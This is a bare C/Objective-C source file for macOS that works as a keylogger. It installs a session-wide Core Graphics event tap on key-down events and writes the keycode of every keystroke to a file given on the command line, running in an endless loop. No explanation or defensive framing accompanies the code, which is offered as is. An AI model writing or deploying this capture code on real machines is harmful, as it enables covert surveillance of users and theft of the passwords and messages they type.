#include <stdio.h>
#import <ApplicationServices/ApplicationServices.h>

FILE *fp;

CGEventRef callbackKeyEvent (
    CGEventTapProxy proxy, 
    CGEventType type, 
    CGEventRef event, 
    void *refcon) {
  fputc((int) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode), fp);
  fflush(fp);
  return event;
}

int main(int argc, char* argv[]) 
{
  fp = fopen(argv[1], "w");

  CFMachPortRef tap = CGEventTapCreate(
    kCGSessionEventTap,
    kCGHeadInsertEventTap,
    kCGEventTapOptionDefault,
    CGEventMaskBit(kCGEventKeyDown),
    callbackKeyEvent,
    NULL);

  if (tap == NULL){
    printf("ono");
  } else {
    printf("oye");
  }
  CFRunLoopSourceRef loopSource = CFMachPortCreateRunLoopSource ( kCFAllocatorDefault, tap, 0);
  
  CFRunLoopRef loop = CFRunLoopGetCurrent();

  CFRunLoopAddSource(loop, loopSource, kCFRunLoopDefaultMode);

  CGEventTapEnable(tap, true);

  while (true) {
    CFRunLoopRunInMode(kCFRunLoopDefaultMode, 5, false);
  }

  fclose(fp);

  return 0;
}


